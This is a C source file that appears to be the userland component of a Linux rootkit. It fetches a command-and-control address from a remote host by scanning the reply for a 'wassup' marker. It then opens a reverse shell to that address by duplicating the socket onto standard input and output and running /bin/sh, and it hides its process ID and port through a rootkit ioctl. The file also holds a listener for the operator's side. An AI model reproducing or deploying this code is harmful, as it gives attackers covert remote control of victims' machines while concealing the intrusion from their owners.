#include "XJJ_util.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

int socket_connect( const char* host , in_port_t port ) {
  struct hostent *hp ;
  struct sockaddr_in addr ;
  int on = 1 , sock ;

  if( ( hp = gethostbyname( host ) ) == NULL ) {
#ifdef _DEBUG_
    herror( "gethostbyname" ) ;
#endif
    exit( 1 ) ;
  }
  bcopy( hp->h_addr , &addr.sin_addr , hp->h_length ) ;
  addr.sin_port = htons( port ) ;
  addr.sin_family = AF_INET ;
  sock = socket( PF_INET , SOCK_STREAM , IPPROTO_TCP ) ;
  setsockopt( sock , IPPROTO_TCP , TCP_NODELAY , ( const char* )&on , sizeof( int ) ) ;
  if( sock == -1 ) {
#ifdef _DEBUG_
    perror( "setsockopt" ) ;
#endif
    exit( 1 ) ;
  }
  if( connect( sock , ( struct sockaddr * )&addr , sizeof( struct sockaddr_in ) ) == -1 ) {
#ifdef _DEBUG_
    perror( "connect" ) ;
#endif
    exit( -1 ) ;
  }
  return sock ;
}

#define BUFFER_SIZE 44

void get_CC_address( char* addr ) {
  char* address ;
  address = ( char* )malloc( 128 * sizeof( char ) ) ;
  bzero( address , 128 ) ;
  int found[6] = { 0 , 0 , 0 , 0 , 0 , 0 } ;
  int fd , i ;
  char buffer[BUFFER_SIZE] ;
  fd = socket_connect( HOST , PORT ) ;
  write( fd , CONTENT , strlen( CONTENT ) ) ;
  bzero( buffer , BUFFER_SIZE ) ;
  while( read( fd , buffer , BUFFER_SIZE ) != 0 ) {
    if( found[0] && found[1] && found[2] && found[3] && found[4] && found[5] ) {
      strcat( address , buffer ) ;
      if( strlen( address ) > 28 ) break ;//length of wassupxxx.xxx.xxx.xxx:xxxxx
      continue ;
    }
    for( i = 0 ; i < BUFFER_SIZE ; i ++ ) {
      if( buffer[i] == 'w' && !found[0] ) {
        found[0] = 1 ;
      }
      else if( buffer[i] == 'a' && found[0] && !found[1] ) {
        found[1] = 1 ;
      }
      else if( buffer[i] == 's' && found[1] && !found[2] ) {
        found[2] = 1 ;
      }
      else if( buffer[i] == 's' && found[2] && !found[3] ) {
        found[3] = 1 ;
      }
      else if( buffer[i] == 'u' && found[3] && !found[4] ) {
        found[4] = 1 ;
      }
      else if( buffer[i] == 'p' && found[4] && !found[5] ) {
        found[5] = 1 ;
      }
      else {
        found[0] = found[1] = found[2] = found[3] = found[4] = found[5] ;
      }
    }
    if( found[0] && found[1] && found[2] && found[3] && found[4] && found[5] ) {
      strcat( address , buffer ) ;
    }
    bzero( buffer , BUFFER_SIZE ) ;
  }
  shutdown( fd , SHUT_RDWR ) ;
  close( fd ) ;
  /* remove front string */
  while( address[0] < '0' || address[0] > '9' ) {
    memcpy( address , address + 1 , strlen( address ) ) ;
  }
  /* remove tail string */
  i = 0 ;
  while( address[i] == ':' || address[i] == '.' || ( address[i] >= '0' && address[i] <= '9' ) ) {
    i ++ ;
  }
  address[i] = '\0' ;
  memmove( addr , address , strlen( address ) ) ;
  return ;
}


void bind_shell( ) {

  hide_pid( ) ;
  
  char buf[22] ; //xxx.xxx.xxx.xxx:xxxxx
  char addr[16] ; //xxx.xxx.xxx.xxx
  char str_port[6] ;
  int port , i = 0 ;
  bzero( buf , 22 ) ;
  bzero( addr , 16 ) ;
  bzero( str_port , 6 ) ;
  
  get_CC_address( buf ) ;
  while( buf[i++] != ':' ) ;
  memcpy( addr , buf , i - 1 ) ;
  memcpy( str_port , buf + i , strlen( buf + i ) ) ;
#ifdef _DEBUG_
  printf( "[+] wassup %s %s %s\n" , buf , addr , str_port ) ;
#endif

  int s;

  s = socket_connect( addr , atoi( str_port ) ) ;

  hide_port( atoi( str_port ) ) ;

  dup2(s, 0);
  dup2(s, 1);
  dup2(s, 2);

  execve("/bin/sh", 0, 0);
    
  return ;

}

void serv_listen( const char* addr , int port ) {

  int resultfd , sockfd ;
  struct sockaddr_in my_addr ;

  sockfd = socket( AF_INET , SOCK_STREAM , 0 ) ;

  int one = 1 ;
  setsockopt( sockfd , SOL_SOCKET , SO_REUSEADDR , &one , sizeof( one ) ) ;

  my_addr.sin_family = AF_INET ;
  my_addr.sin_port = htons( port ) ;
  my_addr.sin_addr.s_addr = inet_addr( addr ) ;

  bind( sockfd , ( struct sockaddr *)&my_addr , sizeof( my_addr ) ) ;

  listen( sockfd , 0 ) ;

  struct sockaddr_in cli_addr = { 0 } ;
  socklen_t cli_addrlen = sizeof( cli_addr ) ;
  resultfd = accept( sockfd , ( struct sockaddr * )&cli_addr , &cli_addrlen ) ;

  char buf[1024] ;
  int nread ;
  struct timeval tv ;
  tv.tv_sec = 0 ;
  tv.tv_usec = 800 ;
  while( 1 ) {
    fd_set ins , outs ;
    FD_ZERO( &ins ) ;
    FD_ZERO( &outs ) ;
    FD_SET( resultfd , &ins ) ;
    FD_SET( 0 , &ins ) ;
    FD_SET( resultfd , &outs ) ;
    int rc = select( resultfd + 1 , &ins , NULL , NULL , &tv ) ;
    if( FD_ISSET( 0 , &ins ) ) {
      nread = read( 0 , buf , 1024 ) ;
      write( resultfd , buf , nread ) ;
    }
    if( FD_ISSET( resultfd , &ins ) ) {
      nread = read( resultfd , buf , 1024 ) ;
      write( 1 , buf , nread ) ;
    }
  }

  return ;
  
}

struct rk_proc_args {
  unsigned short pid ;
} ;
struct rk_port_args {
  unsigned short port ;
} ;
struct rk_file_args {
  char *name ;
  unsigned short namelen ;
} ;
struct rk_args {
  unsigned short cmd ;
  void *ptr ;
} ;

void hide_pid( ) {
  int io ;
  int pid ;
  int sockfd ;
  struct rk_args rk_args ;
  struct rk_proc_args rk_proc_args ;

  sockfd = socket( AF_INET , SOCK_STREAM , 6 ) ;
  if( sockfd < 0 ) {
#ifdef _DEBUG_
    perror( "socket" ) ;
#endif
    exit( 1 ) ;
  }
  pid = getpid( ) ;
  rk_proc_args.pid = pid ;
  rk_args.cmd = 1 ;
  rk_args.ptr = &rk_proc_args ;
  io = ioctl( sockfd , AUTH_TOKEN , &rk_args ) ;
  if( io < 0 ) {
#ifdef _DEBUG_
    perror( "ioctl" ) ;
#endif
    exit( 1 ) ;
  }
}

void hide_port( int port ) {
  int io ;
  int sockfd ;
  struct rk_args rk_args ;
  struct rk_port_args rk_port_args ;

  sockfd = socket( AF_INET , SOCK_STREAM , 6 ) ;
  if( sockfd < 0 ) {
#ifdef _DEBUG_
    perror( "socket" ) ;
#endif
    exit( 1 ) ;
  }

  rk_port_args.port = port ;
  rk_args.cmd = 3 ;
  rk_args.ptr = &rk_port_args ;

  io = ioctl( sockfd , AUTH_TOKEN , &rk_args ) ;
  
}
